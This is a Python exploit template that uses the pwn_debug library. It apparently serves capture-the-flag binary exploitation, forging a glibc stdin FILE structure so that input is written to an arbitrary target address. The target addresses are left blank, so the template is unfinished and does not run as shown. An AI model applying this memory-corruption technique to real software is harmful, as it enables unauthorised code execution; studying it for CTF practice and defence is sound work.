# File: IO_FILE_stdin_arbitrary_write.py
# Author: raycp
# Date: 2019-06-01
# Description: template for arbitrary writing with stdin

from pwn_debug import *


pdbg=pwn_debug("./binary")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc


def pwn():

	#pdbg.bp([])

    ## stdin arbitrary write to address write_target
    write_target=
    write_target_end=

    flag=0
    flag&=~4

    io_stdin_write=IO_FILE_plus()
    io_stdin_write._flags=flag
    io_stdin_write._IO_read_end=_IO_read_ptr        
    io_stdin_write._fileno=0
    io_stdin_write._IO_buf_base=write_target     # target address
    io_stdin_write._IO_buf_end=write_target_end  # target end
 
    io_stdin_write.show()
    io_stdin_write.arbitrary_write_check("stdin")

   
    
    p.interactive() 

if __name__ == '__main__':
    pwn()


